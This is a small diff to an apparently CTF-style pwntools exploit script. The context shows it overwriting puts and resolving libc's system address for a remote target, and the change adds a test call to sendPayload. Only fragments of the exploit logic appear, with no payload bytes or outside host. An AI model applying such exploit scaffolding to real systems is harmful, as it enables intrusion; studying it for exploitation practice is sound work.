@@ -9,6 +9,7 @@ from pwn import *
 #print 'strlen:' + hex( libc.symbols["strlen"] )
 #print 'system:' + hex( libc.symbols["system"] )
 #exit()
+
 remoto = False
 remoto = True
 if remoto:
@@ -91,7 +92,7 @@ def main():
 
 	overwrite_puts()
 	system = get_system_addr()
-
+	sendPayload('test tset')
 	#conn.interactive()
 
 	conn.close()
